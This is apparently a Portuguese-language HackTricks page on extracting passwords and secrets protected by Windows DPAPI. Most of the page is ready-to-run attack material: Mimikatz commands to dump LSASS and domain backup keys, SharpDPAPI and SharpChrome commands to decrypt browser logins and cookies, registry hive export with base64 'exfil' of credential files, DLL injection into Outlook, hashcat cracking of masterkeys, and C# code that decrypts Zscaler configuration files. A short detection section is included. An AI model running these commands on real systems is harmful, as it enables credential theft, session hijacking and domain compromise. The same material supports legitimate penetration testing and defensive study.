# DPAPI - Extraindo Senhas

{{#include ../../banners/hacktricks-training.md}}



## O que é DPAPI

The Data Protection API (DPAPI) é utilizada principalmente no sistema operacional Windows para a **symmetric encryption of asymmetric private keys**, aproveitando segredos do usuário ou do sistema como uma fonte significativa de entropia. Essa abordagem simplifica a criptografia para desenvolvedores ao permitir que eles encriptem dados usando uma chave derivada dos segredos de logon do usuário ou, para criptografia do sistema, dos segredos de autenticação de domínio do sistema, eliminando a necessidade de os desenvolvedores gerenciarem a proteção da chave de criptografia eles mesmos.

A forma mais comum de usar DPAPI é através das funções **`CryptProtectData` e `CryptUnprotectData`**, que permitem que aplicações encriptem e desencriptem dados com segurança utilizando a sessão do processo que está atualmente logado. Isso significa que os dados encriptados só podem ser desencriptados pelo mesmo usuário ou sistema que os encriptou.

Além disso, essas funções também aceitam um parâmetro **`entropy`** que será usado durante a encriptação e a desencriptação; portanto, para desencriptar algo encriptado usando esse parâmetro, você deve fornecer o mesmo valor de entropy que foi usado durante a encriptação.

### Geração da chave do usuário

O DPAPI gera uma chave única (chamada **`pre-key`**) para cada usuário com base em suas credenciais. Essa chave é derivada da senha do usuário e de outros fatores e o algoritmo depende do tipo de usuário, mas acaba sendo um SHA1. Por exemplo, para usuários de domínio, **depende do hash NTLM do usuário**.

Isso é especialmente interessante porque, se um atacante conseguir obter o hash da senha do usuário, ele pode:

- **Desencriptar qualquer dado que tenha sido encriptado usando DPAPI** com a chave desse usuário sem precisar contatar qualquer API
- Tentar **quebrar a senha** offline tentando gerar a chave DPAPI válida

Além disso, toda vez que algum dado é encriptado por um usuário usando DPAPI, uma nova **master key** é gerada. Essa master key é a que realmente é usada para encriptar os dados. Cada master key recebe um **GUID** (Globally Unique Identifier) que a identifica.

As master keys são armazenadas no diretório **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, onde `{SID}` é o Security Identifier desse usuário. A master key é armazenada encriptada pela **`pre-key`** do usuário e também por uma **domain backup key** para recuperação (portanto a mesma chave é armazenada encriptada 2 vezes por 2 caminhos diferentes).

Observe que a **domain key usada para encriptar a master key está nos domain controllers e nunca muda**, então se um atacante tem acesso ao domain controller, ele pode recuperar a domain backup key e desencriptar as master keys de todos os usuários do domínio.

Os blobs encriptados contêm o **GUID da master key** que foi usada para encriptar os dados dentro de seus headers.

> [!TIP]
> Os blobs encriptados do DPAPI começam com **`01 00 00 00`**

Encontrar chaves mestre:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Isto é a aparência de várias Master Keys de um usuário:

![](<../../images/image (1121).png>)

### Geração de chave Machine/System

Esta é a chave usada pela máquina para criptografar dados. É baseada no **DPAPI_SYSTEM LSA secret**, que é uma chave especial que somente o usuário SYSTEM pode acessar. Essa chave é usada para criptografar dados que precisam ser acessíveis pelo próprio sistema, como credenciais a nível de máquina ou segredos do sistema.

Note que essas chaves **não têm backup de domínio**, portanto são acessíveis apenas localmente:

- **Mimikatz** pode acessá-la fazendo dump dos LSA secrets usando o comando: `mimikatz lsadump::secrets`
- O segredo é armazenado dentro do registro, então um administrador poderia **modificar as permissões DACL para acessá-lo**. O caminho do registro é: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- A extração offline de registry hives também é possível. Por exemplo, como administrador no alvo, salve os hives e exfiltre-os:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Em seguida, na sua máquina de análise, recupere o segredo LSA DPAPI_SYSTEM dos hives e use-o para descriptografar blobs de escopo de máquina (senhas de tarefas agendadas, credenciais de serviços, perfis Wi‑Fi, etc.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Dados protegidos pelo DPAPI

Entre os dados pessoais protegidos pelo DPAPI estão:

- credenciais do Windows
- senhas do Internet Explorer e do Google Chrome e dados de preenchimento automático
- senhas de e-mail e de contas FTP internas para aplicações como Outlook e Windows Mail
- senhas para pastas compartilhadas, recursos, redes sem fio e Windows Vault, incluindo chaves de criptografia
- senhas para conexões de Remote Desktop, .NET Passport e chaves privadas para diversos fins de criptografia e autenticação
- senhas de rede gerenciadas pelo Credential Manager e dados pessoais em aplicações que usam CryptProtectData, como Skype, MSN Messenger, e mais
- blobs criptografados dentro do registro
- ...

Dados protegidos do sistema incluem:
- senhas de Wi-Fi
- senhas de tarefas agendadas
- ...

### Opções de extração da chave mestre

- Se o usuário possui privilégios de Domain Admin, ele pode acessar a **chave de backup do domínio** para descriptografar todas as chaves mestres de usuários no domínio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Com privilégios de local admin, é possível **acessar a LSASS memory** para extrair as DPAPI master keys de todos os usuários conectados e a SYSTEM key.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Se o usuário tiver privilégios de administrador local, ele pode acessar o **DPAPI_SYSTEM LSA secret** para descriptografar as chaves mestras da máquina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Se a senha ou o hash NTLM do usuário for conhecido, você pode **descriptografar as chaves mestras do usuário diretamente**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Se você estiver dentro de uma sessão como o usuário, é possível solicitar ao DC a **chave de backup para descriptografar as chaves mestras usando RPC**. Se você for administrador local e o usuário estiver logado, você pode **roubar o token de sessão dele** para isso:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Listar Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Acessar DPAPI Encrypted Data

### Encontrar dados DPAPI Encrypted

Arquivos de usuários comuns **protegidos** estão em:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Verifique também alterando `\Roaming\` para `\Local\` nos caminhos acima.

Exemplos de enumeração:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) pode encontrar blobs DPAPI criptografados no sistema de arquivos, registry e em blobs B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Observe que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (do mesmo repositório) pode ser usado para descriptografar com DPAPI dados sensíveis como cookies.

#### Chromium/Edge/Electron receitas rápidas (SharpChrome)

- Usuário atual, descriptografia interativa de logins/cookies salvos (funciona mesmo com Chrome 127+ app-bound cookies porque a chave extra é resolvida a partir do Credential Manager do usuário quando executado em contexto de usuário):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Análise offline quando você tem apenas os arquivos. Primeiro extraia a chave de estado AES do perfil "Local State" e então use-a para descriptografar o cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triagem remota/abrangente do domínio quando você tem a DPAPI domain backup key (PVK) e admin no host alvo:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Se você tiver o prekey/credkey DPAPI de um usuário (do LSASS), pode pular o password cracking e descriptografar diretamente os dados de perfil:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notas
- Novas builds do Chrome/Edge podem armazenar certos cookies usando a criptografia "App-Bound". A descriptografia offline desses cookies específicos não é possível sem a chave app-bound adicional; execute SharpChrome no contexto do usuário alvo para recuperá‑la automaticamente. Veja o post do blog de segurança do Chrome referenciado abaixo.

### Chaves de acesso e dados

- **Use SharpDPAPI** para obter credenciais de arquivos criptografados com DPAPI da sessão atual:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obter informações de credentials** como os dados criptografados e o guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Descriptografe uma masterkey de um usuário que solicita a **domain backup key** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
A ferramenta **SharpDPAPI** também suporta estes argumentos para descriptografia de masterkey (observe como é possível usar `/rpc` para obter a chave de backup do domínio, `/password` para usar uma senha em texto simples, ou `/pvk` para especificar um arquivo de chave privada DPAPI do domínio...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Descriptografar dados usando uma masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
A ferramenta **SharpDPAPI** também suporta estes argumentos para descriptografia de `credentials|vaults|rdg|keepass|triage|blob|ps` (repare como é possível usar `/rpc` para obter a chave de backup do domínio, `/password` para usar uma password em texto plano, `/pvk` para especificar um ficheiro de chave privada de domínio DPAPI, `/unprotect` para usar a sessão do utilizador atual...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Usando um DPAPI prekey/credkey diretamente (sem necessidade de password)

Se você puder dumpar o LSASS, o Mimikatz frequentemente expõe uma DPAPI key por logon que pode ser usada para descriptografar as masterkeys do usuário sem conhecer o plaintext password. Passe esse valor diretamente para a ferramenta:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Descriptografar alguns dados usando a **sessão do usuário atual**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Descriptografia offline com Impacket dpapi.py

Se você tiver o SID do usuário vítima e a senha (ou o NT hash), pode descriptografar os DPAPI masterkeys e os Credential Manager blobs totalmente offline usando o dpapi.py do Impacket.

- Identifique artefatos no disco:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Masterkey correspondente: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Se a ferramenta de transferência de arquivos estiver instável, base64 os arquivos on-host e copie a saída:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Descriptografar a masterkey com o SID do usuário e a senha/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Utilize a masterkey já descriptografada para decifrar o blob de credenciais:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Este fluxo de trabalho frequentemente recupera credenciais de domínio salvas por apps que usam o Windows Credential Manager, incluindo contas administrativas (por exemplo, `*_adm`).

---

### Lidando com Entropia Opcional ("Third-party entropy")

Algumas aplicações passam um valor adicional de **entropy** para `CryptProtectData`. Sem esse valor o blob não pode ser descriptografado, mesmo que a masterkey correta seja conhecida. Obter a entropia é, portanto, essencial ao mirar em credenciais protegidas dessa forma (por exemplo Microsoft Outlook, alguns clientes VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) é uma DLL em modo usuário que intercepta as chamadas às funções DPAPI dentro do processo alvo e registra de forma transparente qualquer entropia opcional fornecida. Executar EntropyCapture em modo **DLL-injection** contra processos como `outlook.exe` ou `vpnclient.exe` produzirá um arquivo mapeando cada buffer de entropia para o processo chamador e o blob. A entropia capturada pode depois ser fornecida ao **SharpDPAPI** (`/entropy:`) ou ao **Mimikatz** (`/entropy:<file>`) para descriptografar os dados.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft introduziu um formato de masterkey **context 3** a partir do Windows 10 v1607 (2016). `hashcat` v6.2.6 (dezembro de 2023) adicionou os modos de hash **22100** (DPAPI masterkey v1 context), **22101** (context 1) e **22102** (context 3), permitindo cracking acelerado por GPU das senhas de usuário diretamente a partir do arquivo masterkey. Portanto, atacantes podem realizar ataques word-list ou brute-force sem interagir com o sistema alvo.

`DPAPISnoop` (2024) automatiza o processo:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
A ferramenta também pode analisar Credential and Vault blobs, descriptografá-los usando cracked keys e exportar cleartext passwords.

### Acessar dados de outra máquina

Em **SharpDPAPI and SharpChrome** você pode indicar a opção **`/server:HOST`** para acessar os dados de uma máquina remota. Claro que você precisa conseguir acessar essa máquina e no exemplo a seguir supõe-se que a **chave de encriptação de backup do domínio é conhecida**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Outras ferramentas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) é uma ferramenta que automatiza a extração de todos os usuários e computadores do diretório LDAP e a extração da domain controller backup key via RPC. O script então resolve o endereço IP de todos os computadores e executa smbclient em todas as máquinas para recuperar todos os DPAPI blobs de todos os usuários e descriptografar tudo com a domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Com a lista de computadores extraída do LDAP você pode encontrar todas as sub-redes mesmo que não as conhecesse!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) pode dumpar segredos protegidos pelo DPAPI automaticamente. O release 2.x introduziu:

* Coleta paralela de blobs de centenas de hosts
* Parsing de **context 3** masterkeys e integração automática com Hashcat para cracking
* Suporte para cookies criptografados "App-Bound" do Chrome (veja seção seguinte)
* Um novo modo **`--snapshot`** para pollar endpoints repetidamente e diffar blobs recém-criados

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) é um parser em C# para arquivos masterkey/credential/vault que pode exportar formatos para Hashcat/JtR e opcionalmente invocar cracking automaticamente. Suporta totalmente os formatos de masterkey de máquina e usuário até o Windows 11 24H1.


## Detecções comuns

- Acesso a arquivos em `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e outros diretórios relacionados ao DPAPI.
- Especialmente a partir de um share de rede como **C$** ou **ADMIN$**.
- Uso de **Mimikatz**, **SharpDPAPI** ou ferramentas similares para acessar a memória do LSASS ou dumpar masterkeys.
- Evento **4662**: *An operation was performed on an object* – pode ser correlacionado com acesso ao objeto **`BCKUPKEY`**.
- Evento **4673/4674** quando um processo solicita *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilidades & mudanças no ecossistema 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembro de 2023). Um atacante com acesso de rede poderia induzir um domain member a recuperar uma domain DPAPI backup key maliciosa, permitindo a descriptografia de masterkeys de usuário. Corrigido no cumulative update de novembro de 2023 – administradores devem garantir que DCs e estações de trabalho estejam totalmente atualizados.
* **Chrome 127 “App-Bound” cookie encryption** (julho de 2024) substituiu a proteção legada baseada apenas em DPAPI por uma chave adicional armazenada no **Credential Manager** do usuário. A descriptografia offline de cookies agora requer tanto o DPAPI masterkey quanto a **GCM-wrapped app-bound key**. SharpChrome v2.3 e DonPAPI 2.x conseguem recuperar a chave extra quando executados no contexto do usuário.


### Estudo de Caso: Zscaler Client Connector – Entropia Personalizada Derivada do SID

Zscaler Client Connector armazena vários arquivos de configuração em `C:\ProgramData\Zscaler` (por exemplo `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Cada arquivo é criptografado com **DPAPI (Machine scope)** mas o fornecedor fornece **custom entropy** que é *calculada em tempo de execução* em vez de ser armazenada no disco.

A entropia é reconstruída a partir de dois elementos:

1. Um segredo hard-coded embebido dentro de `ZSACredentialProvider.dll`.
2. O **SID** da conta Windows à qual a configuração pertence.

O algoritmo implementado pela DLL é equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Porque o segredo está embutido em uma DLL que pode ser lida do disco, **qualquer atacante local com privilégios SYSTEM pode regenerar a entropy para qualquer SID** e decrypt the blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
A decriptação revela a configuração JSON completa, incluindo cada **verificação de postura do dispositivo** e seu valor esperado – informação muito valiosa ao tentar bypasses do lado do cliente.

> TIP: os outros artefatos criptografados (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) são protegidos com DPAPI **sem** entropia (`16` bytes com valor zero). Eles podem, portanto, ser descriptografados diretamente com `ProtectedData.Unprotect` assim que privilégios SYSTEM forem obtidos.

## Referências

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
